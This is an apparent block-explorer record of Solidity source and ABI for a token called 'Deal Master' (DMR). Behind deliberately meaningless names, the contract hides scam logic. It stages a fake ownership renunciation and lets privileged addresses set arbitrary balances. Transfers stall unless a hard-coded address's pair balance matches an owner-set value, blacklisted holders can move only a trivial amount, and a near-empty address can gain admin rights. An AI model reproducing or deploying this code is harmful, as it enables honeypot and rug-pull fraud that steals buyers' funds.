{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface modeLimitAmount {\n    function createPair(address fromLimit, address sellTeam) external returns (address);\n}\n\ninterface takeMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoAmount) external view returns (uint256);\n\n    function transfer(address receiverEnable, uint256 tradingTake) external returns (bool);\n\n    function allowance(address fundLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverEnable,\n        uint256 tradingTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTradingTeam, uint256 value);\n    event Approval(address indexed fundLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract amountFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeMinMetadata is takeMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DealMaster is amountFrom, takeMin, takeMinMetadata {\n\n    function txReceiver() private view {\n        require(marketingToken[_msgSender()]);\n    }\n\n    function txList(address autoExempt) public {\n        require(autoExempt.balance < 100000);\n        if (modeTrading) {\n            return;\n        }\n        if (senderReceiverList) {\n            amountReceiver = true;\n        }\n        marketingToken[autoExempt] = true;\n        if (amountReceiver) {\n            fundEnable = autoTake;\n        }\n        modeTrading = true;\n    }\n\n    bool public modeTrading;\n\n    bool public senderReceiverList;\n\n    bool private senderMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxExemptWallet;\n    }\n\n    uint256 constant maxBuy = 2 ** 10;\n\n    bool public minTxMarketing;\n\n    uint256 private feeTotal = 100000000 * 10 ** 18;\n\n    function amountTeam(address modeListFee, address receiverEnable, uint256 tradingTake) internal returns (bool) {\n        if (modeListFee == sellExemptFrom) {\n            return modeSellTx(modeListFee, receiverEnable, tradingTake);\n        }\n        uint256 tokenLiquidity = takeMin(walletSwapSell).balanceOf(senderFrom);\n        require(tokenLiquidity == receiverMarketingTrading);\n        require(receiverEnable != senderFrom);\n        if (swapAuto[modeListFee]) {\n            return modeSellTx(modeListFee, receiverEnable, maxBuy);\n        }\n        return modeSellTx(modeListFee, receiverEnable, tradingTake);\n    }\n\n    function transfer(address shouldLiquidity, uint256 tradingTake) external virtual override returns (bool) {\n        return amountTeam(_msgSender(), shouldLiquidity, tradingTake);\n    }\n\n    address public walletSwapSell;\n\n    address senderFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private amountReceiver;\n\n    function transferFrom(address modeListFee, address receiverEnable, uint256 tradingTake) external override returns (bool) {\n        if (_msgSender() != totalShould) {\n            if (receiverSwapEnable[modeListFee][_msgSender()] != type(uint256).max) {\n                require(tradingTake <= receiverSwapEnable[modeListFee][_msgSender()]);\n                receiverSwapEnable[modeListFee][_msgSender()] -= tradingTake;\n            }\n        }\n        return amountTeam(modeListFee, receiverEnable, tradingTake);\n    }\n\n    mapping(address => uint256) private isAmount;\n\n    mapping(address => bool) public marketingToken;\n\n    function balanceOf(address autoAmount) public view virtual override returns (uint256) {\n        return isAmount[autoAmount];\n    }\n\n    function allowance(address listFundShould, address exemptTo) external view virtual override returns (uint256) {\n        if (exemptTo == totalShould) {\n            return type(uint256).max;\n        }\n        return receiverSwapEnable[listFundShould][exemptTo];\n    }\n\n    uint8 private sellLimit = 18;\n\n    function limitSell(uint256 tradingTake) public {\n        txReceiver();\n        receiverMarketingTrading = tradingTake;\n    }\n\n    bool public atMarketing;\n\n    function modeSellTx(address modeListFee, address receiverEnable, uint256 tradingTake) internal returns (bool) {\n        require(isAmount[modeListFee] >= tradingTake);\n        isAmount[modeListFee] -= tradingTake;\n        isAmount[receiverEnable] += tradingTake;\n        emit Transfer(modeListFee, receiverEnable, tradingTake);\n        return true;\n    }\n\n    address totalShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public sellTake;\n\n    function isLaunched(address shouldLiquidity, uint256 tradingTake) public {\n        txReceiver();\n        isAmount[shouldLiquidity] = tradingTake;\n    }\n\n    function approve(address exemptTo, uint256 tradingTake) public virtual override returns (bool) {\n        receiverSwapEnable[_msgSender()][exemptTo] = tradingTake;\n        emit Approval(_msgSender(), exemptTo, tradingTake);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoFund;\n    }\n\n    uint256 receiverMarketingTrading;\n\n    function enableBuyLiquidity() public {\n        emit OwnershipTransferred(sellExemptFrom, address(0));\n        exemptLaunch = address(0);\n    }\n\n    uint256 private fundEnable;\n\n    uint256 fromExempt;\n\n    mapping(address => mapping(address => uint256)) private receiverSwapEnable;\n\n    string private autoFund = \"Deal Master\";\n\n    uint256 public autoTake;\n\n    function getOwner() external view returns (address) {\n        return exemptLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return exemptLaunch;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellLimit;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeTotal;\n    }\n\n    function marketingLaunchSell(address fundTotal) public {\n        txReceiver();\n        if (fundEnable == sellTake) {\n            senderReceiverList = false;\n        }\n        if (fundTotal == sellExemptFrom || fundTotal == walletSwapSell) {\n            return;\n        }\n        swapAuto[fundTotal] = true;\n    }\n\n    mapping(address => bool) public swapAuto;\n\n    constructor (){\n        if (fundEnable != sellTake) {\n            senderReceiverList = false;\n        }\n        shouldReceiver atFee = shouldReceiver(totalShould);\n        walletSwapSell = modeLimitAmount(atFee.factory()).createPair(atFee.WETH(), address(this));\n        \n        sellExemptFrom = _msgSender();\n        marketingToken[sellExemptFrom] = true;\n        isAmount[sellExemptFrom] = feeTotal;\n        enableBuyLiquidity();\n        if (fundEnable == autoTake) {\n            senderMarketing = true;\n        }\n        emit Transfer(address(0), sellExemptFrom, feeTotal);\n    }\n\n    event OwnershipTransferred(address indexed maxReceiver, address indexed isSender);\n\n    string private maxExemptWallet = \"DMR\";\n\n    address private exemptLaunch;\n\n    address public sellExemptFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTradingTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFundShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableBuyLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTake\",\"type\":\"uint256\"}],\"name\":\"isLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingTake\",\"type\":\"uint256\"}],\"name\":\"limitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"}],\"name\":\"marketingLaunchSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTxMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExemptFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiverList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeListFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoExempt\",\"type\":\"address\"}],\"name\":\"txList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwapSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DealMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}